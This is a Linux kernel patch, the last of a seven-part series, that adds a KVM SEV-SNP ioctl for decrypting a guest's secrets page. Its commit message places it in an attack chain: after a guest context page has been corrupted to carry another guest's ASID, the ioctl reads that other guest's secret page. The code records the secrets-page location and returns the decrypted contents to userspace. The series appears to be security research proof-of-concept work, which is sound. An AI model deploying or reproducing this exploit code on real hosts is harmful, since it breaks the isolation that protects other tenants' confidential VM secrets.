From de87b4de3a70d0f1c36ef609df3dd33eff12f5c2 Mon Sep 17 00:00:00 2001
From: Tom Dohrmann <erbse.13@gmx.de>
Date: Thu, 4 Jan 2024 20:57:28 +0000
Subject: [PATCH 7/7] add ioctl for decrypting last secret page

After we corrupted a guest context page in such a way that it contains
the ASID of another guest, we'll use this to read the secret page of
said guest.
---
 arch/x86/kvm/svm/sev.c   | 55 ++++++++++++++++++++++++++++++++++++++++
 include/uapi/linux/kvm.h |  6 +++++
 2 files changed, 61 insertions(+)

diff --git a/arch/x86/kvm/svm/sev.c b/arch/x86/kvm/svm/sev.c
index 0a7320fb0362..3cfe81c1788e 100644
--- a/arch/x86/kvm/svm/sev.c
+++ b/arch/x86/kvm/svm/sev.c
@@ -2074,6 +2074,8 @@ static int snp_launch_start(struct kvm *kvm, struct kvm_sev_cmd *argp)
 	return rc;
 }
 
+static kvm_pfn_t secret_pfn;
+
 static int snp_launch_update_gfn_handler(struct kvm *kvm,
 					 struct kvm_gfn_range *range,
 					 void *opaque)
@@ -2146,6 +2148,12 @@ static int snp_launch_update_gfn_handler(struct kvm *kvm,
 			goto e_release;
 		}
 
+		if (params.page_type == KVM_SEV_SNP_PAGE_TYPE_SECRETS) {
+			pr_info("Detected secret page at pfn %llx\n", pfns[i]);
+			// Store the location of the secret page for later.
+			secret_pfn = pfns[i];	
+		}
+
 		data.address = __sme_set(pfns[i] << PAGE_SHIFT);
 		data.page_size = X86_TO_RMP_PG_LEVEL(PG_LEVEL_4K);
 		data.page_type = params.page_type;
@@ -2482,6 +2490,50 @@ int do_snp_guest_status(struct kvm *kvm, struct kvm_sev_cmd *argp)
 	return ret;
 }
 
+static int snp_dbg_decrypt_pfn(struct kvm *kvm, struct kvm_sev_cmd *argp)
+{
+	struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
+	struct kvm_sev_snp_dbg params;
+	kvm_pfn_t src_pfn;
+	struct page *tmp_page;
+	u64 dst_pfn;
+	u64 gctx_pfn;
+	int ret;
+
+	if (!sev_snp_guest(kvm))
+		return -ENOTTY;
+
+	if (!sev->snp_context)
+		return -EINVAL;
+
+	if (copy_from_user(&params, (void __user *)(uintptr_t)argp->data,
+			   sizeof(params)))
+		return -EFAULT;
+
+	// Decrypt the last secret page.
+	src_pfn = secret_pfn;
+
+	tmp_page = alloc_page(GFP_KERNEL_ACCOUNT);
+	if (!tmp_page)
+		return -ENOMEM;
+	dst_pfn = page_to_pfn(tmp_page);
+
+	gctx_pfn = __pa(sev->snp_context) >> PAGE_SHIFT;
+	ret = snp_guest_dbg_decrypt_page(gctx_pfn, src_pfn, dst_pfn, &argp->error);
+	if (ret)
+		goto free_tmp_page;
+
+	if (copy_to_user((void __user *)(uintptr_t)params.dst_uaddr, page_address(tmp_page), PAGE_SIZE))
+		ret = -EFAULT;
+
+free_tmp_page:
+
+	__free_page(tmp_page);
+
+	return ret;
+}
+
+
 int sev_mem_enc_ioctl(struct kvm *kvm, void __user *argp)
 {
 	struct kvm_sev_cmd sev_cmd;
@@ -2590,6 +2642,9 @@ int sev_mem_enc_ioctl(struct kvm *kvm, void __user *argp)
 	case KVM_SEV_SNP_GUEST_STATUS:
 		r = do_snp_guest_status(kvm, &sev_cmd);
 		break;
+	case KVM_SEV_SNP_DBG_DECRYPT_PFN:
+		r = snp_dbg_decrypt_pfn(kvm, &sev_cmd);
+		break;
 	default:
 		r = -EINVAL;
 		goto out;
diff --git a/include/uapi/linux/kvm.h b/include/uapi/linux/kvm.h
index c1862db99ee0..026c5be304ee 100644
--- a/include/uapi/linux/kvm.h
+++ b/include/uapi/linux/kvm.h
@@ -1976,6 +1976,7 @@ enum sev_cmd_id {
 	KVM_SEV_SNP_GET_CERTS,
 	KVM_SEV_SNP_SET_CERTS,
 	KVM_SEV_SNP_GUEST_STATUS,
+	KVM_SEV_SNP_DBG_DECRYPT_PFN,
 
 	KVM_SEV_NR_MAX,
 };
@@ -2123,6 +2124,11 @@ struct kvm_sev_snp_launch_finish {
 	__u8 pad[6];
 };
 
+struct kvm_sev_snp_dbg {
+	__u64 src_gfn;
+	__u64 dst_uaddr;
+};
+
 struct kvm_sev_snp_get_certs {
 	__u64 certs_uaddr;
 	__u64 certs_len;
-- 
2.34.1

